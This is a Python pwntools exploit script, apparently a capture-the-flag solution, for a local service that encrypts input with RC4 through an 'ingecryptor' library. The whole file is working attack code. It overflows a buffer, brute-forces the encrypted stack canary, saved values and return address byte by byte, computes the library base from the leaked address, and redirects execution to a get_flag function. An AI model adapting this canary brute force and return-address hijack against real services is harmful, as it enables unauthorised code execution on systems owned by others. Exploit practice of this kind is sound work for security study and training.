import sys
from Crypto.Cipher import ARC4
from pwn import *


context.log_level = "error"
context.log_level = "debug"

key = b"AAABC"
offset = 256 + 8

enc_stack = b""
# enc_stack = b"\xecY\xba\xde9\xf6((\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\t\xc7d\x9d\xcb\xf6I\x8c\x815\x02L\x81\xbc\xb1Q"


# 5 qword to bruteforce
# canary
# XXXXXXXX
# YYYYYYYY
# rbp
# ret_addr
for i in range(len(enc_stack), 8 * 5):
    for c in range(1, 0x100):
        # it will halt here
        # if i == 33 and c in [0x02, 0x17, 0x1D]:
        #     continue
        print(f"trying byte {i}: {c:02x}", end="\n")
        payload = b"A" * offset + enc_stack + bytes([c])
        t = remote("127.0.0.1", 1234)
        t.recv()
        t.send("2")
        t.recvline()
        t.send(b"AAABC")
        t.recvline()
        t.send(payload)
        # when bruteforcing the ret address
        # same cases will just block the process
        # to avoid that we use a 1s timeout
        buff = t.recvall(timeout=1)
        x = len(buff) - offset

        # print(payload)
        # print(x)
        if x != -264:
            print(f"Found byte {i}: {c:02x}")
            enc_stack += bytes([c])
            print(f"enc_stack: {enc_stack}")
            break

print(f"enc_stack\n{enc_stack}")
data = b"A" * offset + enc_stack

rc4 = ARC4.new(key)

stack = rc4.decrypt(data)
leak = stack[256 + 8 * 5 :]
ret_addr = u64(leak)
print(f"ret_addr: 0x{ret_addr:016x}")

# extracted from a gdb session
ret_addr_offset = 0x2495E
lib_base_addr = ret_addr - ret_addr_offset
print(f"lib_base_addr: 0x{lib_base_addr:016x}")

# extracted from ingecryptor shared library file
get_flag_offset = 0x3BD9
get_flag_addr = lib_base_addr + get_flag_offset
print(f"get_flag_addr: 0x{get_flag_addr:016x}")

# test payload
# new_data = stack[:-8] + p64(ret_addr)

new_data = stack[:-8] + p64(get_flag_addr) + p64(ret_addr)

rc4 = ARC4.new(key)
payload = rc4.encrypt(new_data)
print(f"payload\n{payload}")

t = remote("127.0.0.1", 1234)
t.recv()
t.send("2")
t.recvline()
t.send(b"AAABC")
t.recvline()
t.send(payload)
buff = t.recvall()
print(buff)
